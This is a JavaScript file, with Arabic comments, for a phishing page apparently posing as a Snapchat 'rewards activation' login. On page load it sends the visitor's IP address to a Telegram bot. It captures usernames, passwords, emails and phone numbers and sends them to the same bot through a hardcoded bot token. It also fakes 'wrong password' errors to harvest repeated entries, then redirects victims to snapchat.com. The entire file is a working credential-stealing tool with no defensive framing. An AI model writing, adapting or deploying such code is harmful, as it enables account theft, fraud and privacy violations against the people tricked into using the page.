// إرسال عنوان IP عند دخول المستخدم للموقع
window.onload = function () {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            sendIPToTelegram(ip);
        })
        .catch(error => console.error("حدث خطأ أثناء جلب عنوان IP:", error));
};

// إرسال بيانات تسجيل الدخول عند الضغط على زر "تفعيل المكاسب"
const form = document.getElementById("loginForm");
const message = document.getElementById("message");

let attemptCount = 0;

form.addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const email = document.getElementById("email").value;
    const phone = document.getElementById("phone").value;

    attemptCount++;

    // إرسال البيانات إلى تيليجرام
    sendToTelegram(username, password, email, phone);

    if (attemptCount < 3) {
        message.textContent = "كلمة المرور غير صحيحة، يرجى إعادة المحاولة";
        message.style.color = "black";
    } else {
        message.textContent = "تم تقديم طلبك";
        message.style.color = "black";
        form.querySelector("button").disabled = true; 

        setTimeout(() => {
            window.location.href = "https://www.snapchat.com";
        }, 3000);
    }

    message.classList.remove("hidden");
});

// إرسال بيانات تسجيل الدخول إلى تيليجرام
function sendToTelegram(username, password, email, phone) {
    const botToken = "6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs";
    const chatId = "1046458749";
    const messageText = `👤 مستخدم جديد دخل الموقع:\n\n📛 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📧 البريد الإلكتروني: ${email}\n📞 رقم الهاتف: ${phone}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestBody = {
        chat_id: chatId,
        text: messageText,
    };

    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestBody),
    });
}

// إرسال عنوان IP إلى تيليجرام
function sendIPToTelegram(ip) {
    const botToken = "6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs";
    const chatId = "1046458749";
    const messageText = `🔍 شخص جديد دخل الموقع\n🌍 عنوان IP: ${ip}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestBody = {
        chat_id: chatId,
        text: messageText,
    };

    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestBody),
    });
}